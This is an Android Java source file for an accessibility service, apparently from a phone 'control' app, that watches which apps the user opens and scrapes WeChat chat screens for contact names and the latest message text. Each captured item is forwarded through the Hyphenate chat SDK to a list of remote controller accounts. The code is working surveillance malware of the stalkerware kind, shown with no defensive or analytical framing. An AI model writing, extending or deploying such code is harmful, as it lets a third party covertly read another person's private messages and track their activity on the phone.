package com.lfish.control.service;

import android.accessibilityservice.AccessibilityService;
import android.annotation.TargetApi;
import android.content.Context;
import android.os.Build;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Toast;

import com.hyphenate.chat.EMClient;
import com.hyphenate.chat.EMMessage;
import com.lfish.control.ControlApplication;
import com.lfish.control.action.actiontool.Utils;

import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;

/**
 * Created by shenmegui on 2017/9/15.
 */
public class PhoneActivityService extends AccessibilityService {
    public static String TAG ="PhoneActivityService";
    private String lastCacheName="",ChatRecord="",ChatName="",VideoSecond="", cacheTellName="";
    public static Map <String,Long> controlList = new HashMap<String,Long>();

    @TargetApi(Build.VERSION_CODES.JELLY_BEAN_MR2)
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        AccessibilityNodeInfo ani = getRootInActiveWindow();
        if (ani != null) {
            ani.refresh(); // to fix issue with viewIdResName = null on Android 6+
        }
        switch (event.getEventType()){
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                controlActivityChange(event);
                break;
            case AccessibilityEvent.TYPE_VIEW_SCROLLED:
                wechatTell(event);
                break;
        }
    }

    /**
     * 微信聊天记录监听
     */
    @TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    private void wechatTell(AccessibilityEvent event) {
        String className = event.getClassName().toString();
        //判断是否是微信聊天界面
        if ("com.tencent.mm".equals(event.getPackageName())) {
            //获取当前聊天页面的根布局
            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            // 微信首页 第一个元素为资第一 view.，聊天界面第一个节点为linnerlayout
            if(rootNode!=null && className.equals("android.widget.ListView") && rootNode.getChildCount()>0 && rootNode.getChild(0).getClassName().toString().equals("android.widget.LinearLayout")) {
//                //查询聊天对象名称
                getWeChatTellRecode(rootNode);
//                //聊天记录 回传
//                getChatRecord(rootNode);
            }else{
//                sendText("微信:聊天界面获取根节点失败");
            }
        }
    }

    /**
     * 监控 窗口变化
     * @param event
     */
    private void controlActivityChange(AccessibilityEvent event) {
        if(lastCacheName.equals(event.getPackageName().toString())){
            return;
        }
        String appInfoByPackageName = Utils.getAppInfoByPackageName(ControlApplication.context, event.getPackageName().toString());
        sendText(appInfoByPackageName);

        lastCacheName = event.getPackageName().toString();

    }

    @Override
    public void onInterrupt() {

    }

    public static boolean isAccessibilitySettingsOn(Context mContext) {
        int accessibilityEnabled = 0;
        final String service = "com.lfish.control/com.lfish.control.service.PhoneActivityService";
        boolean accessibilityFound = false;
        try {
            accessibilityEnabled = Settings.Secure.getInt(
                    mContext.getApplicationContext().getContentResolver(),
                    android.provider.Settings.Secure.ACCESSIBILITY_ENABLED);
            Log.v(TAG, "accessibilityEnabled = " + accessibilityEnabled);
        } catch (Settings.SettingNotFoundException e) {
            Log.e(TAG, "Error finding setting, default accessibility to not found: "
                    + e.getMessage());
        }
        TextUtils.SimpleStringSplitter mStringColonSplitter = new TextUtils.SimpleStringSplitter(':');

        if (accessibilityEnabled == 1) {
            Log.v(TAG, "***ACCESSIBILIY IS ENABLED*** -----------------");
            String settingValue = Settings.Secure.getString(
                    mContext.getApplicationContext().getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (settingValue != null) {
                TextUtils.SimpleStringSplitter splitter = mStringColonSplitter;
                splitter.setString(settingValue);
                while (splitter.hasNext()) {
                    String accessabilityService = splitter.next();

                    Log.v(TAG, "-------------- > accessabilityService :: " + accessabilityService);
                    if (accessabilityService.equalsIgnoreCase(service)) {
                        Log.v(TAG, "We've found the correct setting - accessibility is switched on!");
                        return true;
                    }
                }
            }
        } else {
            Log.v(TAG, "***ACCESSIBILIY IS DISABLED***");
        }

        return accessibilityFound;
    }

    /**
     * 遍历所有控件，找到头像Imagview，里面有对联系人的描述
     */
    @TargetApi(Build.VERSION_CODES.JELLY_BEAN_MR2)
    private void getWeChatTellRecode(AccessibilityNodeInfo node) {

        List<AccessibilityNodeInfo> accessibilityNodeInfosByViewId1 = node.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/gz");
        if(accessibilityNodeInfosByViewId1.size()>0){
            AccessibilityNodeInfo accessibilityNodeInfo = accessibilityNodeInfosByViewId1.get(0);
             cacheTellName = accessibilityNodeInfo.getText().toString().trim();
        }

        List<AccessibilityNodeInfo> bqc = node.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/a5j");
        if(bqc.size()>0){
            AccessibilityNodeInfo accessibilityNodeInfo = bqc.get(0);
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(accessibilityNodeInfo.getChildCount() - 1);
            List<AccessibilityNodeInfo> imageicoS = child.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/io");
            if(imageicoS.size()>0){
                AccessibilityNodeInfo imageico = imageicoS.get(0);
                CharSequence contentDescription = imageico.getContentDescription();
                ChatName = contentDescription.toString().replace("头像", "");

                //----根据名称查询，首页文字变化
                List<AccessibilityNodeInfo> homeUserItemName = getRootInActiveWindow().findAccessibilityNodeInfosByViewId("com.tencent.mm:id/ajc");
                List<AccessibilityNodeInfo> homeUserItemText = getRootInActiveWindow().findAccessibilityNodeInfosByViewId("com.tencent.mm:id/aje");
                for(int i=0;i<homeUserItemName.size();i++){
                    if(homeUserItemName.get(i).getText().toString().trim().equals(cacheTellName)){
//                        Toast.makeText(ControlApplication.context,homeUserItemName.get(i).getText()+"="+i+ homeUserItemName.get(i).getParent().getParent().getParent().getParent().getClassName().toString(),Toast.LENGTH_LONG).show();
                        String text = homeUserItemText.get(i).getText().toString();
                        if(ChatRecord.equals(text)){
                            return;
                        }
                        ChatRecord = text;
                        sendText(ChatName+":"+ChatRecord);

                    }
                }
            }
        }

        // --- find last recode
    }

    public void sendText(String text){
        Iterator<Map.Entry<String, Long>> iterator = controlList.entrySet().iterator();
        while (iterator.hasNext()){
            Map.Entry<String, Long> next = iterator.next();
            EMMessage message = EMMessage.createTxtSendMessage(text, next.getKey());
            //发送消息
            EMClient.getInstance().chatManager().sendMessage(message);
        }

    }

    public void sendText(String text,String to){
        EMMessage message = EMMessage.createTxtSendMessage(text, to);
        //发送消息
        EMClient.getInstance().chatManager().sendMessage(message);
    }

}
